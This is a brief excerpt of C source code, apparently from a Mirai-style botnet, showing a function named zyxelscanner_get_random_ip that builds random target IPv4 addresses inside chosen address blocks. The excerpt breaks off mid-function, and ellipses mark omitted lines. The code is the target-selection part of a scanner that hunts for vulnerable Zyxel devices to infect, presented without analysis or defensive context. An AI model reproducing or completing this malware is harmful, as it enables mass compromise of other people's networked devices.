...
static ipv4_t zyxelscanner_get_random_ip(void)
{
    ...
    if (randnum == 0)
    {
        return INET_ADDR(94,o2,o3,o4);
    }
    if (randnum == 1)
    {
        return INET_ADDR(62,o2,o3,o4);
    }
	if (randnum == 2)
    {
        return INET_ADDR(31,o2,o3,o4);
    }
    if (randnum == 3)
    {
